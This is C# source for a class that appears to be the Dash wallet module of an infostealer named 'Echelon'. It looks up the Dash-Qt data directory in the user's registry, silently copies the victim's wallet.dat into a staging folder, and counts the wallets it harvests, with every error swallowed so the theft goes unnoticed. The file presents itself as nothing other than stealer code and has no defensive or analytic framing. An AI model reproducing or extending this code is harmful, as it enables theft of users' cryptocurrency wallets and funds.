


using System.IO;
using Microsoft.Win32;

namespace Echelon
{
    internal class DashCore
    {
        public static int count;

        public static void DSHcoinStr(string directorypath) 
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\DashCore\\");
                        File.Copy(registryKey.GetValue("strDataDir") + "\\wallet.dat", directorypath + "\\DashCore\\wallet.dat");
                        count++;
                        Wallets.count++;
                    }
                    catch {}
                }
            }
            catch {}
        }
    }
}
